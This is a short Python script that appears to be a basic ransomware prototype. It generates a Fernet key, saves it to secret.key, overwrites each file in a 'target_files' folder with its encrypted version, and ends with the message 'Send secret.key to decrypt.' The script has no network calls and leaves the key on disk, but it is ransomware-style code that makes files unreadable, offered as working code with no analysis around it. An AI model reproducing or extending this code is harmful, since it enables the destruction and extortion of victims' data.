import os
from cryptography.fernet import Fernet

# Generate and save a key for decryption
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    return key

# Load the key
def load_key():
    return open("secret.key", "rb").read()

# Encrypt a file with Fernet
def encrypt_file(filepath, key):
    f = Fernet(key)
    with open(filepath, "rb") as file:
        data = file.read()
    encrypted_data = f.encrypt(data)
    with open(filepath, "wb") as file:
        file.write(encrypted_data)

# Encrypt all files in a target folder
def encrypt_folder(folder_path, key):
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)
            print(f"Encrypted: {file_path}")

if __name__ == "__main__":
    folder = "target_files"  # Target folder
    key = generate_key()     # Generate encryption key
    encrypt_folder(folder, key)
    print("\nAll files encrypted. Send secret.key to decrypt.")
